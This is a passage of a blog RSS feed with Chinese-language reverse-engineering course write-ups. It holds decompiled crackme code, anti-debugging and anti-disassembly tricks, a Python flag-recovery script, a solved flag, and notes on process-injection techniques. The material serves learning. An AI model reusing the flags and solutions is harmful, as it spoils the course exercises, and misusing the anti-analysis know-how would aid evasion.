&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::spoiler Real File main Function&lt;/p></description></item><item><title>Simple Reverse - 0x30(2023 HW - Evil FlagChecker)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x302023-hw---evil-flagchecker/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x302023-hw---evil-flagchecker/</guid><description>&lt;h1 id="simple-reverse---0x302023-hw---evil-flagchecker">
 Simple Reverse - 0x30(2023 HW - Evil FlagChecker)
 &lt;a class="anchor" href="#simple-reverse---0x302023-hw---evil-flagchecker">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Anti Disassembly - 這一部分可以看一下碩一修的malware reverse的anti disassembly的修復(就是d和c的交錯使用)
Anti Debugging - 首推scylla hide&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA main&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">__cdecl&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>envp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DWORD TickCount; &lt;span style="color:#75715e">// [esp+0h] [ebp-14h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v5; &lt;span style="color:#75715e">// [esp+8h] [ebp-Ch]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> TickCount &lt;span style="color:#f92672">=&lt;/span> GetTickCount();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Sleep(&lt;span style="color:#ae81ff">120000u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> GetTickCount() &lt;span style="color:#f92672">-&lt;/span> TickCount;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v5 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">119950&lt;/span> &lt;span style="color:#f92672">||&lt;/span> v5 &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">120050&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ExitProcess(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ((&lt;span style="color:#66d9ef">void&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>)(&lt;span style="color:#66d9ef">void&lt;/span>))loc_401AE0)();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
:::spoiler IDA loc_401AE0&lt;/p>
&lt;pre tabindex="0">&lt;code>.text:00401AE0 loc_401AE0: ; CODE XREF: _main:loc_4014AB↑p
.text:00401AE0 push ebp
.text:00401AE1 mov ebp, esp
.text:00401AE3 lea esi, aHelloHacker ; &amp;#34;Hello Hacker&amp;#34;
.text:00401AE9 mov al, 48h ; &amp;#39;H&amp;#39;
.text:00401AEB cmp [esi], al
.text:00401AED jz short loc_401AF0
.text:00401AED
.text:00401AED ; ---------------------------------------------------------------------------
.text:00401AEF db 0E8h
.text:00401AF0 ; ---------------------------------------------------------------------------
.text:00401AF0
.text:00401AF0 loc_401AF0: ; CODE XREF: .text:00401AED↑j
.text:00401AF0 nop word ptr [eax+eax+00000000h]
.text:00401AF9 jmp short loc_401B01
.text:00401AF9
.text:00401AF9 ; ---------------------------------------------------------------------------
.text:00401AFB db 48h ; H
.text:00401AFC db 65h ; e
.text:00401AFD db 6Ch ; l
.text:00401AFE db 6Ch ; l
.text:00401AFF db 6Fh ; o
.text:00401B00 db 0
.text:00401B01 ; ---------------------------------------------------------------------------
.text:00401B01
.text:00401B01 loc_401B01: ; CODE XREF: .text:00401AF9↑j
.text:00401B01 jmp short loc_401B0E
.text:00401B01
.text:00401B01 ; ---------------------------------------------------------------------------
.text:00401B03 db 0E8h
.text:00401B04 db 66h ; f
.text:00401B05 db 0Fh
.text:00401B06 db 1Fh
.text:00401B07 db 84h
.text:00401B08 db 0
.text:00401B09 db 0
.text:00401B0A db 0
.text:00401B0B db 0
.text:00401B0C byte_401B0C db 0
.text:00401B0D db 0E8h
.text:00401B0E ; ---------------------------------------------------------------------------
.text:00401B0E
.text:00401B0E loc_401B0E: ; CODE XREF: .text:loc_401B01↑j
.text:00401B0E jz short loc_401B13
.text:00401B0E
.text:00401B10 jnz short loc_401B13
.text:00401B10
.text:00401B10 ; ---------------------------------------------------------------------------
.text:00401B12 db 0E8h
.text:00401B13 ; ---------------------------------------------------------------------------
.text:00401B13
.text:00401B13 loc_401B13: ; CODE XREF: .text:loc_401B0E↑j
.text:00401B13 ; .text:00401B10↑j
.text:00401B13 push 1
.text:00401B15 jmp sub_401220
&lt;/code>&lt;/pre>&lt;p>:::
:::spoiler IDA notify_debugger&lt;/p></description></item><item><title>Simple Reverse 0x06(Lab - AMessageBox)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x06lab---amessagebox/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x06lab---amessagebox/</guid><description>&lt;h1 id="simple-reverse-0x06lab---amessagebox">
 Simple Reverse 0x06(Lab - AMessageBox)
 &lt;a class="anchor" href="#simple-reverse-0x06lab---amessagebox">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.796t.com/content/1550025925.html">組合語言ROL和RCL的區別&lt;/a>&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題其實以逆向的角度來說很簡單&lt;/p>
&lt;ol>
&lt;li>先用DIE看一些資訊
&lt;img src="https://hackmd.io/_uploads/BkFoZ06u3.png" alt="" />
發現有加UPX的殼，這件事情可以透過IDA更加確定
&lt;img src="https://hackmd.io/_uploads/ryG0-Aau3.png" alt="" />
可以看到Function Name只有start然後反組譯的地方看起來很噁心，那應該就是在拆殼的步驟&lt;/li>
&lt;li>先執行看看
&lt;img src="https://hackmd.io/_uploads/HktlXCaun.png" alt="" />
需要輸入flag然後用一個message box噴錯&lt;/li>
&lt;li>用x64-dbg
透過TA的講解，可以知道這一題不需要解殼，只需要用動態debugger看一下就可以了
&lt;ol>
&lt;li>我們知道題目有使用到message box的API，所以我們可以先鎖定該API在哪邊呼叫，再往回trace出他的判斷
我們可以利用符號的視窗看到這支程式有用到那些API Module(.dll)，而message box的API是在&lt;code>user32.dll&lt;/code>，用下面的搜尋可以縮小範圍，但這個多種類的messagebox，具體來說是用哪一個也不知道，所以可以全選後都設立中斷點
&lt;img src="https://hackmd.io/_uploads/S18CNR6_h.png" alt="" />&lt;/li>
&lt;li>剩下的就是跟一般debugger差不多的操作，當追到call messagebox之前的break point時，可以看一下call stack(呼叫堆疊)往前trace是誰呼叫了API，發現是&lt;code>00C7110B&lt;/code>，點進去看一下可以明顯看到Correct/Wrong的字樣，所以可以判斷應該是這一段程式在判斷我們輸入的東西
&lt;img src="https://hackmd.io/_uploads/r1E7LAad3.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/Syt_8Cadh.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/BkixvRTOn.png" alt="" />&lt;/li>
&lt;li>分析判斷的程式
這裡就是要考驗耐心和不斷的觀察register的變化，認真看大概花個半小時就可以知道這一段在幹嘛(我就菜QAQ)
&lt;img src="https://hackmd.io/_uploads/S10aORTd2.png" alt="" />&lt;/li>
&lt;li>結論是中間的那些==重要的操作==其實就是左旋轉+XOR &lt;code>0x87&lt;/code>這樣而已，所以我們就可以開寫腳本了，把東西反著作回去就好了&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">import binascii

enc_flag = [0xB5, 0xE5, 0x8D, 0xBD, 0x5C, 0x46, 0x36, 0x4E, 0x4E, 0x1E, 0x0E, 0x26, 0xA4, 0x1E, 0x0E, 0x4E, 0x46, 0x06, 0x16, 0xAC, 0xB4, 0x3E, 0x4E, 0x16, 0x94, 0x3E, 0x94, 0x8C, 0x94, 0x8C, 0x9C, 0x4E, 0xA4, 0x8C, 0x2E, 0x46, 0x8C, 0x6C]

def pad(m):
 length = 0
 if len(m) % 8 != 0:
 length = 8-len(m) % 8
 return &amp;#39;0&amp;#39; * length + m

FLAG = []
for i in range(len(enc_flag)):
 enc_flag[i] ^= 0x87
 tmp = pad(bin(enc_flag[i])[2:])
 tmp = hex(int(tmp[-3:] + tmp[:-3], 2))
 FLAG.append(binascii.unhexlify(tmp[2:]).decode())

print(&amp;#34;&amp;#34;.join(FLAG))
&lt;/code>&lt;/pre>&lt;p>Flag: &lt;code>FLAG{8699314d319802ef792b7babac9da58a}&lt;/code>&lt;/p></description></item><item><title>Simple Reverse 0x08(Lab - GetProcAddress)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x08lab---getprocaddress/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x08lab---getprocaddress/</guid><description>&lt;h1 id="simple-reverse-0x08lab---getprocaddress">
 Simple Reverse 0x08(Lab - GetProcAddress)
 &lt;a class="anchor" href="#simple-reverse-0x08lab---getprocaddress">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulefilenamea?ns-enrollment-type=Collection&amp;amp;ns-enrollment-id=rdg3b1j45ye486">GetModuleFileNameA 函式&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/fileapi/nf-fileapi-createfilea">createFileA 函式&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/fileapi/nf-fileapi-setfilepointer?ns-enrollment-type=Collection&amp;amp;ns-enrollment-id=rdg3b1j45ye486">setFilePointer 函式&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/fileapi/nf-fileapi-readfile">ReadFile 函式&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA main function&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">int __cdecl main(int argc, const char **argv, const char **envp)
{
 char *v3; // rdi
 __int64 i; // rcx
 char v6[32]; // [rsp+0h] [rbp-40h] BYREF
 char v7; // [rsp+40h] [rbp+0h] BYREF
 char lpFilename[304]; // [rsp+50h] [rbp+10h] BYREF
 char lpBuffer[136]; // [rsp+180h] [rbp+140h] BYREF
 char flag[64]; // [rsp+208h] [rbp+1C8h] BYREF
 __int64 File_HANDLE_VALUE; // [rsp+248h] [rbp+208h]
 int j; // [rsp+264h] [rbp+224h]

 v3 = &amp;amp;v7;
 for ( i = 146i64; i; --i )
 {
 *v3 = 0xCCCCCCCC;
 v3 += 4;
 }
 sub_140011375(&amp;amp;unk_1400230B5);
 sub_1400113AC();
 printf(&amp;#34;Give me flag: &amp;#34;);
 scanf(&amp;#34;%39s&amp;#34;, flag);
 (GetModuleFileNameA_0)(0i64, lpFilename, 260i64);
 File_HANDLE_VALUE = (CreateFileA)(
 lpFilename,
 0x80000000i64,
 FILE_SHARE_READ,
 0i64,
 OPEN_EXISTING,
 FILE_ATTRIBUTE_NORMAL,
 0i64);
 if ( File_HANDLE_VALUE == -1
 || ((SetFilePointer)(File_HANDLE_VALUE, 0x4Ei64, 0i64, FILE_BEGIN),
 !(ReadFile)(File_HANDLE_VALUE, lpBuffer, 39i64, 0i64, 0i64)) )
 {
LABEL_11:
 puts(&amp;#34;Wrong...&amp;#34;);
 }
 else
 {
 for ( j = 0; j &amp;lt; 39; ++j )
 {
 if ( (flag[j] ^ lpBuffer[j]) != byte_14001E000[8 * j] )
 goto LABEL_11;
 }
 puts(&amp;#34;Correct!!!&amp;#34;);
 }
 sub_140011311(v6, &amp;amp;unk_14001BB18);
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse 0x11(Lab - Exception)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x11lab---exception/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x11lab---exception/</guid><description>&lt;h1 id="simple-reverse-0x11lab---exception">
 Simple Reverse 0x11(Lab - Exception)
 &lt;a class="anchor" href="#simple-reverse-0x11lab---exception">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://mycollegenotebook.medium.com/%E4%B9%98%E6%B3%95-%E9%99%A4%E6%B3%95%E7%9A%84%E9%81%8B%E7%94%A8-%E7%B5%84%E5%90%88%E8%AA%9E%E8%A8%80%E7%AD%86%E8%A8%98-638b1eac4696">乘法、除法的運用 — 組合語言筆記&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/cpp/cpp/try-except-statement?view=msvc-170&amp;amp;viewFallbackFrom=msvc-170%3Fns-enrollment-type%3DCollection&amp;amp;ns-enrollment-id=rdg3b1j45ye486">try-except 陳述式&lt;/a>&lt;/p>
&lt;blockquote>
&lt;ul>
&lt;li>EXCEPTION_CONTINUE_EXECUTION (-1) 例外狀況已關閉。 在例外狀況發生的位置繼續執行。&lt;/li>
&lt;li>EXCEPTION_CONTINUE_SEARCH 無法辨識 (0) 例外狀況。 繼續搜尋處理常式的堆疊，先搜尋包含 try-except 語句，然後針對具有下一個最高優先順序的處理常式。&lt;/li>
&lt;li>EXCEPTION_EXECUTE_HANDLER 辨識 (1) 例外狀況。 藉由執行 __except 複合陳述式將控制權傳送至例外狀況處理常式，然後在 區塊之後 __except 繼續執行。&lt;/li>
&lt;/ul>&lt;/blockquote>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Psuedo Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">__cdecl&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>envp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> Str[&lt;span style="color:#ae81ff">112&lt;/span>]; &lt;span style="color:#75715e">// [rsp+20h] [rbp+0h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> i; &lt;span style="color:#75715e">// [rsp+A0h] [rbp+80h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf(&lt;span style="color:#e6db74">&amp;#34;Give me flag: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> scanf(&lt;span style="color:#e6db74">&amp;#34;%s&amp;#34;&lt;/span>, Str);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( strlen(Str) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">38&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">38&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( Str[i] &lt;span style="color:#f92672">!=&lt;/span> byte_14000A000[i] )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_7;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Correct :&amp;gt;&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_7:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Wrong :&amp;lt;&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse 0x12(Lab - TLSCallback)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x12lab---tlscallback/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x12lab---tlscallback/</guid><description>&lt;h1 id="simple-reverse-0x12lab---tlscallback">
 Simple Reverse 0x12(Lab - TLSCallback)
 &lt;a class="anchor" href="#simple-reverse-0x12lab---tlscallback">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.youtube.com/live/4-hgyiCV3ZA?feature=share&amp;amp;t=6624">課程相關影片&lt;/a>
&lt;a href="https://medium.com/@racktar7743/c%e8%aa%9e%e8%a8%80-function-pointer%e7%9a%84%e6%87%89%e7%94%a8-%e5%9b%9b-function-pointer-array-d0d624db8406">[C語言] function pointer的應用[四]: function pointer array&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA main function&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">__cdecl&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>envp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">__int64&lt;/span> v3; &lt;span style="color:#75715e">// rbx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v4; &lt;span style="color:#75715e">// edi
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v5; &lt;span style="color:#75715e">// r14
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>v6; &lt;span style="color:#75715e">// rsi
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v7; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>v8; &lt;span style="color:#75715e">// rcx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf(&lt;span style="color:#e6db74">&amp;#34;Give me flag: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> scanf(&lt;span style="color:#e6db74">&amp;#34;%58s&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v3 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> flag;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (funcs_140001156[v4 &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">3u&lt;/span>])(&lt;span style="color:#f92672">&amp;amp;&lt;/span>flag[v5]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>v6;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v7 &lt;span style="color:#f92672">=&lt;/span> v5 &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>v4;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>v5;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v6 &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">+=&lt;/span> key_140004050[v7];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( v4 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">58&lt;/span> );
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( flag[v3] &lt;span style="color:#f92672">==&lt;/span> byte_1400022B8[v3] )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">++&lt;/span>v3 &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">58&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v8 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Correct!&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_7;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v8 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Wrong QAO&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_7:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(v8);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse 0x13(Lab - Meow)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x13lab---meow/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x13lab---meow/</guid><description>&lt;h1 id="simple-reverse-0x13lab---meow">
 Simple Reverse 0x13(Lab - Meow)
 &lt;a class="anchor" href="#simple-reverse-0x13lab---meow">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.youtube.com/live/4-hgyiCV3ZA?feature=share&amp;amp;t=7028">課程影片 - Process Injection&lt;/a>
一開始看真的看不太懂，只知道大概的邏輯，簡單來說應該是在原有的process中插入其他的process使其被執行，有以下幾種&lt;/p>
&lt;ul>
&lt;li>DLL Injection&lt;/li>
&lt;li>APC Injection&lt;/li>
&lt;li>Early Bird APC Injection&lt;/li>
&lt;li>Process Hollowing&lt;/li>
&lt;li>Reflective DLL Injection&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>其實這一題如果沒有TA先破哏，基本上我是直接放棄的，解題之前可以先看&lt;a href="https://www.youtube.com/live/4-hgyiCV3ZA?feature=share&amp;amp;t=10348">破哏教學&lt;/a>
簡單來說這整支程式就是先把預先藏好的code解密出來，然後利用Process Hollowing的方式inject到原本的程式，而這支外插進來的code就會對我們輸入的flag進行一些操作，然後再跟他原本的encrypted flag進行比較。當我們知道這些事情之後，就可以開始分析了&lt;/p>
&lt;ol>
&lt;li>
&lt;p>先在IDA中找到隱藏的code解密的function
我是直接看TA教學的部分，不然我應該也找不出來，除非用x64dbg慢慢跟，具體來說是在main function中if statement的第二個function
&lt;img src="https://hackmd.io/_uploads/S1DtpV-K3.png" alt="" />
